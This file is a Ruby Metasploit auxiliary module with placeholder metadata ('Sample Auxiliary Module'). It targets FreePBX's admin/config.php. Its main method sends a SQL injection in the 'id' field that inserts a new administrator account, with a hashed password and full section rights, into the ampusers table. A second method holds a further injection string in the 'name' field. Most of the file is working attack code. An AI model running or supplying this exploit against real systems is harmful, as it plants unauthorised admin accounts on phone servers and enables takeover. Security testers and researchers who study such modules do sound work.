##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Sample Auxiliary Module',

        'Description' => 'Sample Auxiliary Module',
        'Author' => ['Joe Module <joem@example.com>'],
        'License' => MSF_LICENSE,
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'DefaultAction' => 'Default Action'
      )
    )
    register_options([
      OptString.new('USERNAME', [true, 'The valid FreePBX user', 'admin']),
      OptString.new('FAKE_USERNAME', [false, 'Username for inserted user']),
      OptString.new('FAKE_PASSWORD', [false, 'Password for inserted user']),

    ])
  end

  def run
    username = datastore['FAKE_USERNAME'] || Rex::Text.rand_text_alphanumeric(rand(4..10))
    password = datastore['FAKE_PASSWORD'] || Rex::Text.rand_text_alphanumeric(rand(6..12))
    password = Digest::SHA1.hexdigest(password)

    custom_extension_injection(username, password)
    # basestation_injection(username,password)
  end

  def sql_firmare_injection; end

  def model_basefile_injection; end

  def custom_extension_injection(username, password)
    send_request_cgi({
      'uri' => normalize_uri('admin', 'config.php'),
      'method' => 'POST',
      'headers' => {
        'Authorization' => basic_auth(datastore['USERNAME'], Rex::Text.rand_text_alphanumeric(6))
      },
      'vars_get' => {
        'display' => 'endpoint',
        'view' => 'customExt'
      },
      'vars_post' => {
        'id' => %<1';INSERT INTO ampusers (username, password_sha1, sections) VALUES ('#{username}', '#{password}', 0x2a)#>
      }
    })
  end

  def basestation_injection(_username, _password)
    send_request_cgi({
      'uri' => normalize_uri('admin', 'config.php'),
      'method' => 'POST',
      'headers' => {
        'Authorization' => basic_auth(datastore['USERNAME'], Rex::Text.rand_text_alphanumeric(6)),
        'Referer' => 'http://192.168.168.223/admin/config.php?display=endpoint&new=1&view=basestation'
      },
      'vars_get' => {
        'display' => 'endpoint',
        'new' => 1,
        'view' => 'basestation'
      },
      'vars_post' => {
        'id' => '',
        'name' => %(1';SELECT * FROM ampusers WHERE ''='),
        'brand' => 'Sangoma',
        'template' => 'sangoma_default',
        'mac' => '7a%3A29%3A78%3A0a%3Ae9%3A4b',
        'ac' => 1231,
        'repeater1' => '',
        'repeater2' => '',
        'repeater3' => '',
        'multicell' => 'no',
        'sync_chain_id' => 512,
        'sync_time' => 60,
        'sync_data_transport' => 'multicast',
        'primary_data_sync_ip' => '0.0.0.0',
        'sync_debug_enable' => 0,
        'action' => 'save_basestation'
      }
    })
  end

end
